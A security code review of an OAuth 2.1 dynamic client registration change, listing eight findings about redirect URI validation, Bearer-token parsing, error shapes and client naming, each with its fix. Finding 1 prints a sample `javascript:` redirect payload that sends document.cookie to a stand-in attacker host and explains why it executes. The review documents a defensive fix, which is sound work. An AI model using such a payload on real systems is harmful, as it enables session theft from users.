# Code Review: OAuth 2.1 Dynamic Client Registration (Phase 2)

Reviewed the Phase 2 diff on top of the already-committed Phase 1 OAuth work (commit `1fa4f60`): IAT-gated `POST /oauth/register` (RFC 7591), `POST /oauth/initial-access-tokens` admin issuance, the `registration_endpoint` metadata field in both `well-known.controller.ts` and mcp-server's `oauth-metadata.ts`, and the consent screen's `client_name`/redirect-domain display fix (§11.2/§11.4 of `implementation-plan.md`).

Method: 8 independent finder passes (line-by-line, removed-behavior, cross-file tracer, reuse, simplification, efficiency, altitude, conventions) surfaced ~15-18 raw candidates, deduplicated and verified against the actual source. 8 findings survived verification (5 CONFIRMED, 3 PLAUSIBLE); 1 was REFUTED and dropped (see bottom).

**Status: all 8 fixed** (2026-07-19). Each section below now includes a Fix note. Full backend/mcp-server/frontend typecheck, lint, and test suites (861 + 125 + 1499 tests) pass after all fixes. Live-verified against a temporary backend instance: the `javascript:`/`data:` redirect_uri rejection, the static client's self-healed `client_name`, the token minted as "Claude (OAuth)" (not "Claude (static) (OAuth)"), and the admin-endpoint 403 now returning Nest's standard shape.

Ranked most severe first.

---

## 1. Unvalidated `redirect_uris` scheme enables script injection on Approve — CONFIRMED
**Files:** `packages/backend/src/oauth/dto/register-client.dto.ts:20-25`, `packages/frontend/src/features/oauth/components/ConsentScreen.tsx:75-77`

`RegisterClientDto.redirect_uris` is validated with only `@IsString`/`@IsNotEmpty` — no scheme allowlist (`register-client.dto.ts`'s own comment says this is deliberate, to match how `redirect_uri` is validated elsewhere in the module). Neither `authorize()` nor `consent()` in `oauth.controller.ts` scheme-checks it either — both gate purely on exact-string membership in the client's registered `redirectUris` list. So an IAT-holder can register a client with `redirect_uris: ["javascript:fetch('https://evil.example/c/'+document.cookie)//"]`.

Verified live (Playwright, Chromium): `ConsentScreen.tsx`'s `navigateTo()` does `window.location.href = result.redirectTo` unconditionally on Approve. Assigning a `javascript:` URI to `window.location.href` **executes the script in the finance-tracker's own origin** — confirmed by direct browser test, not assumed. A payload ending in `//` survives the backend's `?state=&code=` query-string append (the trailing `//` comments out the appended params as JS). No CSP is configured anywhere in the app that would block this.

Compounding: `redirectDomain()` (`ConsentScreen.tsx`) does `new URL(redirectUri).host`, which returns an **empty string** (not a throw) for a `javascript:` URI — so the one UI signal meant to warn the user about where they're being redirected goes blank instead of alarming, for exactly the payloads that matter. This defeats the core safety justification Phase 2 was built around (§11.2's redirect-domain-as-unspoofable-signal reasoning).

**Impact:** a logged-in user who approves a maliciously-registered client gets arbitrary script execution / session theft on the finance-tracker origin, gated only by the attacker holding a valid IAT (an already-privileged position, but not one that should grant XSS).

**Fix:** `RegisterClientDto.redirect_uris` now uses `@IsUrl({protocols: ['http', 'https'], require_protocol: true, require_tld: false}, {each: true})` instead of a bare `@IsString`/`@IsNotEmpty` — `require_tld: false` keeps `http://localhost:9999/callback`-style test URIs valid while rejecting any non-http(s) scheme. `redirectDomain()` in `ConsentScreen.tsx` also now falls back to the raw `redirect_uri` string when `new URL(...).host` is empty, as defense-in-depth rather than silently rendering blank. Live-verified: registering a client with a `javascript:` or `data:` redirect_uri now returns `400 invalid_request`; a real `https://` redirect_uri still registers successfully. Added `register-client.dto.spec.ts` (6 tests) and two `ConsentScreen.test.tsx` cases.

## 2. Static client's internal label leaks to every real user as "Claude (static)" — CONFIRMED
**Files:** `packages/backend/src/oauth/oauth-clients.service.ts:37`, `packages/backend/src/oauth/oauth.controller.ts:104`

`ensureStaticClient()` hardcodes `clientName: 'Claude (static)'` for the Phase 1 static client — an internal disambiguation label distinguishing it from Phase 2 self-registered clients in code/DB, never meant for end-user display. Only `clientId`/`redirectUris` are configurable via env vars; `clientName` has no override. `authorize()` now forwards `client.clientName` verbatim as the `client_name` query param, and `ConsentScreen.tsx` renders it directly with no mapping (unlike scopes, which do go through a `SCOPE_LABELS` lookup). `oauth.controller.spec.ts:124` explicitly asserts this literal string is what gets forwarded, confirming it's the tested, intended current behavior.

**Impact:** every user connecting through the primary/static Claude integration — the only client seeded today — sees "Connect Claude (static) to Finance Tracker" instead of "Connect Claude to Finance Tracker," and the issued token is named "Claude (static) (OAuth)" in Settings → API Tokens.

**Fix:** `ensureStaticClient()`'s hardcoded `clientName` changed to `'Claude'`. Discovered while live-verifying: the skip-write optimization only compared `redirectUris`, so an *already-provisioned* row (like this dev DB's) would keep the stale name forever even after the code fix, since the `update` branch never touched `clientName`. Extended the comparison and the `update` payload to include `clientName`, so a stale row self-heals on the next backend restart. Live-verified: after restart, `GET /oauth/authorize` for the static client now redirects with `client_name=Claude`, and the minted token is named "Claude (OAuth)". Updated `oauth-clients.service.spec.ts` (added a self-heal regression test) and `oauth.controller.spec.ts`.

## 3. `iat.guard.ts`'s Bearer-token extraction has already drifted from its sibling, with a real behavioral split — CONFIRMED
**Files:** `packages/backend/src/oauth/iat.guard.ts:14-18`, `packages/backend/src/auth/strategies/api-key.strategy.ts:26-31`

`IatGuard`'s local `extractBearerToken()` trims whitespace and rejects an empty-after-trim token. `ApiKeyStrategy`'s inline equivalent does neither — it does `authHeader.slice(7)` with no trim and hands the raw remainder straight to `validate()`. For a header like `"Bearer   token-with-leading-spaces"`, `IatGuard` extracts the clean token while `ApiKeyStrategy` extracts `"  token-with-leading-spaces"` (leading spaces intact) and hashes *that* literal string — a different hash than the one stored for the legitimate token. A client sending a slightly padded Authorization header would authenticate successfully against `IatGuard`-protected routes but be rejected as invalid against `ApiKeyStrategy`-protected routes, for the same credential. No shared helper exists between the two hand-rolled implementations.

**Fix:** extracted a shared `extractBearerToken()` to `packages/backend/src/common/extract-bearer-token.ts` (trims and rejects empty-after-trim, matching `IatGuard`'s original behavior — the stricter of the two). Both `IatGuard` and `ApiKeyStrategy` now import and use it, eliminating the drift.

## 4. IAT `lastUsedAt` bookkeeping failure incorrectly fails an otherwise-valid registration with a 500 — CONFIRMED
**File:** `packages/backend/src/oauth/oauth-initial-access-tokens.service.ts:50-54`

`validate()` `await`s the `lastUsedAt` update with no try/catch before returning `true`; a throw there propagates out of `validate()` as a rejection. `IatGuard.canActivate()` (`iat.guard.ts:35`) also has no try/catch around `await this.initialAccessTokens.validate(token)`, so the rejection escapes the guard entirely — before the intended `OAuthException(401)` is ever constructed — and Nest's default handler turns it into a generic 500, not a clean 401. This is inconsistent with the established sibling pattern: `ApiKeyStrategy`'s equivalent `lastUsedAt` update is fire-and-forget with a logged catch (`void ...update(...).catch(err => logger.warn(...))`), specifically so a transient DB error on cosmetic bookkeeping can't fail the actual auth decision. Low blast radius (`POST /oauth/register` is admin-gated and rate-limited to 10/hour), but a real, low-probability robustness gap with a trivial fix (adopt the same fire-and-forget pattern).

**Fix:** `validate()` now fires the `lastUsedAt` update with `void ...update(...).catch(err => logger.warn(...))`, matching `ApiKeyStrategy`'s pattern exactly — a transient DB error updating this bookkeeping timestamp is now logged, not propagated, and can no longer fail an otherwise-valid registration attempt.

## 5. Admin-only 403 gets reshaped into an RFC 6749 body, inconsistent with every other admin endpoint — CONFIRMED
**File:** `packages/backend/src/oauth/oauth.controller.ts` (`issueInitialAccessToken`, guarded by `JwtAuthGuard`+`AdminGuard`)

The class-level `@UseFilters(OAuthExceptionFilter)` applies to this endpoint too. `AdminGuard` throws a plain `ForbiddenException('Admin access required')`; `OAuthExceptionFilter`'s `errorCodeForStatus()` has no case for 403 and falls through to `invalid_request`, so a non-admin caller gets `{"error": "invalid_request", "error_description": "Admin access required"}` instead of Nest's standard `{"statusCode": 403, "message": "...", "error": "Forbidden"}` shape that every other `AdminGuard`-protected endpoint in this app returns (`scraper-admin.controller.ts`, `admin-users.controller.ts`). No current consumer parses this endpoint's error body (curl/Swagger-only today per the test plan), so no functional breakage yet — but a latent trap for any future admin-UI client.

**Fix:** moved `@UseFilters(OAuthExceptionFilter)` from the controller class level down to method level on the four actual RFC 6749/7591 protocol endpoints (`authorize`, `consent`, `token`, `register`), leaving `issueInitialAccessToken` — an admin management endpoint, not a protocol endpoint — with Nest's default exception handling. Live-verified: a non-admin JWT against `POST /oauth/initial-access-tokens` now returns `{"message":"Admin access required","error":"Forbidden","statusCode":403}`, matching every other `AdminGuard`-protected endpoint.

## 6. Consent-screen fallback message is now wrong for non-Claude clients — PLAUSIBLE
**File:** `packages/frontend/src/features/oauth/components/ConsentScreen.tsx` (missing-params fallback)

The fallback shown when required query params are missing hardcodes "Please restart the connection from Claude." `readOAuthParams()` returns `null` (triggering this) whenever *any* required param is missing, regardless of which registered client's `/authorize` redirect produced the URL — and Phase 2's entire purpose is enabling non-Claude clients (e.g. GitHub Copilot) to reach this same screen. The existing test fixture at `ConsentScreen.test.tsx:65-72` shows `client_name` is often still present in `searchParams` even in the realistic missing-param cases, so the "we can't know which client to blame" defense mostly doesn't hold — the real client name is frequently sitting in `searchParams.get('client_name')` unused. Not touched by this diff directly, but newly exposed to a wider, non-Claude audience by what the diff adds.

**Fix:** the fallback now reads `client_name` directly off `searchParams` (bypassing `readOAuthParams()`'s all-or-nothing gate) and, when present, renders "Please restart the connection from {client_name}." instead of a hardcoded "from Claude"; falls back to "the app you were connecting" only when `client_name` itself is the missing param. Added two `ConsentScreen.test.tsx` cases.

## 7. `registration_endpoint` extends an already-flagged hand-duplication pattern instead of fixing it — PLAUSIBLE
**Files:** `packages/backend/src/oauth/well-known.controller.ts`, `packages/mcp-server/src/oauth-metadata.ts`

Both files independently hand-maintain the same RFC 8414 metadata document; this diff adds `registration_endpoint` to both in sync (no new drift introduced right now). A prior review pass (`test-plan/oauth-connector/code-review.md` finding #6) already flagged this exact duplication pattern (mcp-server's copy had drifted, missing `scopes_supported`) — but that finding's own fix kept the duplication rather than consolidating it, so this diff is consistent with precedent, not violating a specific prior recommendation. Still, this diff had a natural touch-point to reduce the duplicated surface and instead extended it with a 5th hand-mirrored field — a fair "missed opportunity," not a regression.

**Fix:** a full fetch-based consolidation (mcp-server fetching the backend's live metadata document instead of reconstructing it) is a bigger architectural change than this finding's severity warrants — deferred, consistent with the Phase 1 review's own precedent for this exact complaint. Instead, added explicit "SYNC OBLIGATION" doc comments to both `well-known.controller.ts` and `oauth-metadata.ts`, each naming the other file by path, so the next field addition is a documented, discoverable requirement rather than tribal knowledge.

## 8. Redundant `findByClientId` round-trip in `token()` — PLAUSIBLE
**File:** `packages/backend/src/oauth/oauth.controller.ts` (`token()`)

`token()` calls `findByClientId(consumed.clientId)` solely to get `clientName` for the minted token's name — but `consent()` already fetched the same client moments earlier, and `oauth-codes.service.ts`'s `deleteByCodeHash()` already does a Prisma `include` on the `user` relation for the same `delete()` call. Adding `client: {select: {clientName: true}}}` to that existing `include` would eliminate the extra round-trip at effectively zero cost — cheaper than the denormalized-column approach originally considered. Low real-world impact: `/oauth/token` is throttled to 5/min, so this is a minor, low-value cleanup.

**Fix:** added `client: {select: {clientName: true}}` to the existing `delete()` call's `include` in `oauth-codes.service.ts`'s `deleteByCodeHash()` (same query, no extra round-trip), threaded `clientName` through `DeletedCodeWithUser`/`ConsumedOAuthCode`, and `token()` now reads `consumed.clientName` directly instead of a second `findByClientId` lookup. Updated `oauth-codes.service.spec.ts` and `oauth.controller.spec.ts` (the latter's "falls back to a generic token name if the client no longer exists" test was removed — that fallback path no longer exists, since `clientName` is guaranteed by the required Prisma relation on the authorization-code row, not a live lookup).

---

## Dropped after verification

**`OAuthClientsService.register()`'s `clientId` collision is unhandled — REFUTED.** `crypto.randomBytes(16)` gives 128 bits of entropy; collision probability is effectively zero at any realistic volume, and this codebase has zero collision-handling anywhere else for similarly-generated unique tokens (`ApiTokensService.create()`'s `tokenHash`, `OAuthCodesService.issue()`'s `codeHash`) — this diff is consistent with, not divergent from, established convention. The underlying "non-`HttpException` errors fall through `OAuthExceptionFilter` to a generic 500" behavior is also already explicitly acknowledged in a code comment on `authorize()` in the same file, so it isn't a gap this diff introduces.
